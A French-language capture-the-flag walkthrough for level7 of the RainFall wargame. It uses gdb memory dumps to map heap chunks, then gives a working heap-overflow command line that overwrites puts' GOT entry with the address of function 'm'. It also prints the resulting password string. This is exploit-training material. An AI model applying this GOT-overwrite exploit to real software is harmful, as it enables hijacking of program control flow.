on lance gdb, on break juste apres les 2 strcpy
on lance avec : r AAAA BBBB
pour distinguer des 0x414141 et 0x424242 en memoire.


(gdb) x/x $esp+0x1c
0xbffff71c:	0x0804a008

1c vaut 24 : car 20 de stack + 4 (sans doute la globale)

maitenant on va voir ce que contiens cette addresse:
(gdb) x/20x 0x0804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x41414141	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x42424242	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000

on remarque:
    - 0x0804a038 est l'addresse de ce qui contiens les BBBB
    - les malloc font 20 en réalitée, et a 24 se trouve l'addresse du malloc suivant


on va donc faire ca en 2 etapes 1 par strcpy :
	on va changer l'adresse de ptr[3] par l'adresse du GoT de puts.

ensuite 2eme strcpy:
	on va ecrire l'adresse de la fonction 'm' (0x080484f4) dans ptr[3] qui point sur le GoT de puts
	ensuite puts et appeller mais sur l'adresse de 'm'

level7@RainFall:~$ objdump -R level7  | grep puts
08049928 R_386_JUMP_SLOT   puts

level7@RainFall:~$ ./level7 `python -c "print('A' * 20 + '\x08\x04\x99\x28'[::-1] + ' ' +  '\x08\x04\x84\xf4'[::-1])"`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1535129847

('A' * 20 pour l'offset de l'adresse a modifier)
